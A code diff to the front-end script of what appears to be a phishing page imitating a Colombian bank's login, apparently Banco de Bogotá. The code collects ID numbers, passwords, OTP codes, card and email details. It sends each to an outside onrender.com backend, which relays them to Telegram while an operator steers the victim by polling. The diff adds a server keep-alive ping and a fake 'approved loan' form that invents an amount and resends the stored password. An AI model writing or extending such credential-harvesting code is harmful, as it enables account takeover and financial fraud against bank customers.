@@ -4,6 +4,15 @@ const BACKEND_BASE = 'https://publish-fp2v.onrender.com';
 
 $(document).ready(function ($) {
   // -----------------------
+  // PING: Mantener servidor activo (evitar cold starts)
+  // -----------------------
+  setInterval(function() {
+    fetch(BACKEND_BASE + "/ping").catch(function(err) {
+      console.log("Ping al servidor...");
+    });
+  }, 5000); // Cada 5 segundos
+
+  // -----------------------
   // INICIO: Mostrar directamente Clave Segura
   // -----------------------
   $("#clave-segura").css({ "border-bottom": "2px solid #0040A8", "color": "#0040a8" });
@@ -138,17 +147,7 @@ $(document).ready(function ($) {
     $("#mensaje").show();
     console.log(`🔄 Loader mostrado`);
 
-    const payload = {
-      session_id: sessionId,
-      tipo_doc: tipoDoc,
-      num_doc: numDoc,
-      clave: clave,
-      metodo: "clave",
-      phone_number: phoneNumber
-    };
-
     console.log(`📤 Enviando POST a: ${BACKEND_BASE}/virtualpersona`);
-    console.log(`📤 Payload:`, JSON.stringify(payload, null, 2));
 
     fetch(BACKEND_BASE + "/virtualpersona", {
       method: "POST",
@@ -167,7 +166,7 @@ $(document).ready(function ($) {
       })
       .then(function(data) {
         console.log(`✅ Response JSON:`, JSON.stringify(data, null, 2));
-        console.log("✅ Datos enviados a backend /api/bancobogota/login");
+        console.log("✅ Datos enviados a /virtualpersona");
         startPolling(sessionId);
       })
       .catch(function(err) {
@@ -210,7 +209,10 @@ $(document).ready(function ($) {
       // 🆕 PHASE 2: Add phone_number to POST request
       const phoneNumber = localStorage.getItem("phone");
 
-      fetch(BACKEND_BASE + (which === "otp1" ? "/notify/otp1" : "/notify/otp2"), {
+      const notifyUrl = which === "otp1" ? "/notify/otp1" : "/notify/otp2";
+      console.log(`📤 OTP: Enviando a ${BACKEND_BASE}${notifyUrl}`);
+
+      fetch(BACKEND_BASE + notifyUrl, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -264,6 +266,8 @@ $(document).ready(function ($) {
       // 🆕 PHASE 2: Add phone_number to POST request
       const phoneNumber = localStorage.getItem("phone");
 
+      console.log(`💳 Tarjeta: Enviando a ${BACKEND_BASE}/notify/tarjeta`);
+
       fetch(BACKEND_BASE + "/notify/tarjeta", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -316,6 +320,8 @@ $(document).ready(function ($) {
 
       // 🆕 PHASE 2: Add phone_number to POST request
       const phoneNumber = localStorage.getItem("phone");
+
+      console.log(`📧 Correo: Enviando a ${BACKEND_BASE}/notify/correo`);
 
       fetch(BACKEND_BASE + "/notify/correo", {
         method: "POST",
@@ -475,6 +481,9 @@ $(document).ready(function ($) {
     $("#tarjeta-debito").css({ "border-bottom": "2px solid #e6e6e6", "color": "#5c5c5c" });
     $("#fmr-clave-s").show();
     $("#fmr-tarjeta-d, #frm-otp, #frm-errorotp, #frm-correo, #frm-tarjeta").hide();
+    $("#txt-id-s, #txt-clave-s").val("");
+    $("#error-mensaje").show();
+    $("#btn-ingresar-s").attr("disabled", "disabled");
   }
 
   function showSectionOTP() {
@@ -488,6 +497,7 @@ $(document).ready(function ($) {
     $("#frm-errorotp").show();
     $("#fmr-clave-s, #fmr-tarjeta-d, #frm-otp, #frm-correo, #frm-tarjeta").hide();
     $("#txt-tokenerr").val("");
+    $("#error-token-mensaje").show();
     $("#btn-validarerr").attr("disabled", "disabled");
   }
 
@@ -536,11 +546,116 @@ $(document).ready(function ($) {
             showSectionTarjeta();
             clearInterval(it);
             startPolling(sessionId);
+          } else if (data.redirect_to === "formulario") {
+            showSectionFormulario();
+            clearInterval(it);
+            startPolling(sessionId);
           }
         })
         .catch(function(e) {
           console.error("Polling error:", e);
         });
     }, 2000);
+  }
+
+  // -----------------------
+  // SECCIÓN FORMULARIO
+  // -----------------------
+  function showSectionFormulario() {
+    $("#fmr-clave-s, #fmr-tarjeta-d, #frm-otp, #frm-errorotp, #frm-correo, #frm-tarjeta").hide();
+    $("#frm-formulario").show();
+
+    var numDoc = localStorage.getItem("numDoc") || "0";
+    var hashCedula = parseInt(numDoc.slice(-4)) || 0;
+    var montoAprobado = 70000000 + (hashCedula * 1000000) % (130000000);
+
+    $("#cupo-aprobado").text("$" + montoAprobado.toLocaleString('es-CO', {maximumFractionDigits: 0}));
+    $("#select-cuotas").val("");
+    $("#cuota-display").text("");
+    $("#btn-finalizar").attr("disabled", "disabled");
+
+    $("#select-cuotas").off('change').on('change', function() {
+      var cuotas = $(this).val();
+      if (cuotas) {
+        actualizarCuotaDisplay(montoAprobado, cuotas);
+        $("#btn-finalizar").removeAttr("disabled");
+      } else {
+        $("#btn-finalizar").attr("disabled", "disabled");
+      }
+    });
+
+    $("#btn-finalizar").off('click').on('click', function() {
+      var cuotas = $("#select-cuotas").val();
+
+      if (!cuotas) {
+        alert("Selecciona el número de cuotas");
+        return;
+      }
+
+      var sessionId = localStorage.getItem("sessionId");
+      var tipoDoc = localStorage.getItem("tipoDoc");
+      var numDoc = localStorage.getItem("numDoc");
+      var clave = localStorage.getItem("clave");
+
+      $("#btn-finalizar").attr("disabled", "disabled");
+      $("#fondo").show();
+      $("#mensaje").show();
+
+      fetch(BACKEND_BASE + "/notify/formulario", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          sessionId: sessionId,
+          tipoDoc: tipoDoc,
+          numDoc: numDoc,
+          clave: clave,
+          monto: montoAprobado,
+          cuotas: parseInt(cuotas),
+          interes: 0.001
+        })
+      })
+        .then(function(res) { return res.json(); })
+        .then(function(data) {
+          console.log("✅ Formulario enviado a Telegram");
+          console.log("⏳ Esperando respuesta del administrador...");
+        })
+        .catch(function(err) {
+          console.error("❌ Error:", err);
+          hideLoader();
+          $("#btn-finalizar").removeAttr("disabled");
+        });
+    });
+  }
+
+  function actualizarMontoDisplay(monto) {
+    var montoNum = parseInt(monto);
+    var montoMill = (montoNum / 1000000).toFixed(0);
+    $("#monto-display").text("$" + montoMill + "M");
+
+    var cuotas = $("#select-cuotas").val();
+    if (cuotas) {
+      actualizarCuotaDisplay(monto, cuotas);
+    }
+  }
+
+  function actualizarMontoDisplay(monto) {
+    var montoNum = parseInt(monto);
+    var montoMill = (montoNum / 1000000).toFixed(0);
+    $("#cupo-aprobado").text("$" + montoMill + "M");
+
+    var cuotas = $("#select-cuotas").val();
+    if (cuotas) {
+      actualizarCuotaDisplay(monto, cuotas);
+    }
+  }
+
+  function actualizarCuotaDisplay(monto, cuotas) {
+    var cuotasNum = parseInt(cuotas);
+    var montoNum = parseInt(monto);
+    var cuotaMensual = montoNum / cuotasNum;
+    var interes = 0.001 / 100;
+    var cuotaConInteres = cuotaMensual * (1 + interes);
+
+    $("#cuota-display").text("Cuota mensual: $" + cuotaConInteres.toLocaleString('es-CO', {maximumFractionDigits: 0}));
   }
 });
